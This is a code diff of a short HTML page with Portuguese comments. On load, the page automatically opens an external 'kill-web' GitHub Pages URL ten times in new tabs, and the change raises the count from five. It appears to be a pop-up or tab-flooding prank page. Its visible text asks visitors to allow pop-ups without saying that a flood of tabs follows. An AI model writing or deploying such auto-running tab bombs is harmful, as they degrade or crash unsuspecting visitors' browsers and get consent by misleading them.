@@ -3,23 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Open Site 5 Times</title>
+    <title>Open Site 10 Times</title>
     <script>
         function openSite() {
-            // URL correta, sem concatenar caminhos adicionais
-            const url = "https://cleiti6966.github.io/kill-web.github.io"; 
+            // Use a URL fixa, garantindo que não existam problemas de concatenar caminhos errados
+            const url = "https://cleiti6966.github.io/kill-web.github.io/";
+            
+            // Abra o site 10 vezes
             for (let i = 0; i < 10; i++) {
-                // Sempre abrir exatamente o mesmo endereço
                 window.open(url, "_blank");
             }
         }
 
-        // Executa a função ao carregar a página
-        window.onload = openSite;
+        // Garante que a função seja executada apenas uma vez quando a página carregar
+        document.addEventListener("DOMContentLoaded", openSite);
     </script>
 </head>
 <body>
-    <h1>Site será aberto</h1>
-    <p>Aguarde enquanto o site é aberto em novas abas e aperte em sempre permitir pop-ups</p>
+    <h1>Site será aberto automaticamente</h1>
+    <p>Por favor, permita pop-ups para que o site seja aberto.</p>
 </body>
 </html>
